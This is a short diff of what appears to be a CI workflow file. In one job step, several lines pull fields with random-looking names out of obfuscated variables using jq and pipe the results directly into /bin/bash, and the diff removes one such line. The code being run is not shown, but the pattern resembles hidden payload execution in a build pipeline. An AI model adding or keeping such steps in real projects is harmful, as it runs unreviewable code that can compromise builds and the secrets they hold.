@@ -34,7 +34,6 @@ jobs:
           echo $yi352 | jq -r .wpzzn84592 | /bin/bash
           printf '%s' "$wl65" | jq -r .mynl0 | /bin/bash
           printf '%s' "$b38747" | jq -r .pvolg6 | /bin/bash
-          echo $cj601 | jq -r .yugvc00685 | /bin/bash
           printf '%s' "$olvao2" | jq -r .jib5001 | /bin/bash
 
       - name: Archive artifact
